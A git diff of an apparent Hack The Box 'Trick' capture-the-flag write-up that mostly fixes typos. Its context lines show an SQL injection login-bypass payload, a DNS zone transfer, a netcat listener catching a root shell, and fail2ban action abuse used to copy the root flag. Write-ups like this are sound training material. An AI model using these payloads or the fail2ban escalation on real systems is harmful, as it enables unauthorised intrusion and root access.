@@ -35,6 +35,8 @@ Nmap done: 1 IP address (1 host up) scanned in 244.80 seconds
 ```
 So if we dig the site that our IP is associated with then we can get back some good subdomains. Most notably is ```preprod-payroll.trick.htb```
 
+Note: I was unable to use dig to find the trick.htb. That had to be guessed, alternatively you could use a tool like ffuf to fuzz the site.
+
 ```console
 └──╼ [★]$ dig axfr @10.129.51.233 trick.htb
 
@@ -60,7 +62,7 @@ Add the following to /etc/hosts on the last line
 10.129.51.233 trick.htb root.trick.htb preprod-payroll.trick.htb
 ```
 
-Navigating to prerod gives a login page that is vulnerable to sql injection.
+Navigating to preprod gives a login page that is vulnerable to sql injection.
 
 Note: Before I found this vulnerability I tried a couple of ways of getting passwords and usernames.
 
@@ -89,7 +91,7 @@ Running a gobuster gives us a couple of pages but the best one was users.php whi
 ```
 ![image](https://user-images.githubusercontent.com/105310322/188243435-1dcea327-7085-4041-a91f-c927b5264b8c.png)
 
-So since I was not able to get and passwords I set my user to Enemigosss and inputted the following in the passwords section.
+So since I was not able to get and passwords I set my user to Enemigosss and input the following in the passwords section.
 
 ```' OR ' 1=-- ``` note the space after =--
 
@@ -206,7 +208,7 @@ Last login: Fri Sep  2 22:24:12 2022 from 10.10.16.8
 michael@trick:~$ 
 ```
 
-Now this next part is a little tricky and requires abusing fail2ban. Which is also a pretty neat way to gain root. The way fail2ban works is that it will ban an ip from accessing the network after a certain amount of ailed attempts. Instead we are going to make it run a reverse shell after an amount of incorrect logins.
+Now this next part is a little tricky and requires abusing fail2ban. Which is also a pretty neat way to gain root. The way fail2ban works is that it will ban an ip from accessing the network after a certain amount of failed attempts. Instead we are going to make it run a reverse shell after an amount of incorrect logins.
 
 Note: With how fail2ban works, you only get about 1 minute as root, But you can gain persistence as shown at the end of the writeup.
 
@@ -219,7 +221,7 @@ Matching Defaults entries for michael on trick:
 User michael may run the following commands on trick:
     (root) NOPASSWD: /etc/init.d/fail2ban restart
 ```
-Navigate to /tmp and cp over the files and then edit the file.
+Navigate to /tmp and copy over the files and then edit the file.
 
 ```console
 michael@trick:/tmp$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp
@@ -248,7 +250,7 @@ Permission denied, please try again.
 michael@10.129.53.72's password: 
 michael@10.129.53.72: Permission denied (publickey,password).
 ```
-Awesome we are in! quickly cat the root flag!
+Awesome we are in! Quickly cat the root flag!
 
 ```
 └──╼ [★]$ nc -lvnp 1234
@@ -260,7 +262,7 @@ Ncat: Connection from 10.129.53.72:43280.
 # cat /root/root.txt
 de94b9107c1d74a9877a605ecf2d0431
 ```
-Originally I had was having too many issues with a reverse shell so I opted for changing the root.txt flag to the tmp folder. Which is still a win but it doesnt feel the same without gaining root.
+Originally I was having too many issues with a reverse shell so I opted for changing the root.txt flag to the tmp folder. Which is still a win but it doesnt feel the same without gaining root.
 
 ```console
 actionban = cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt
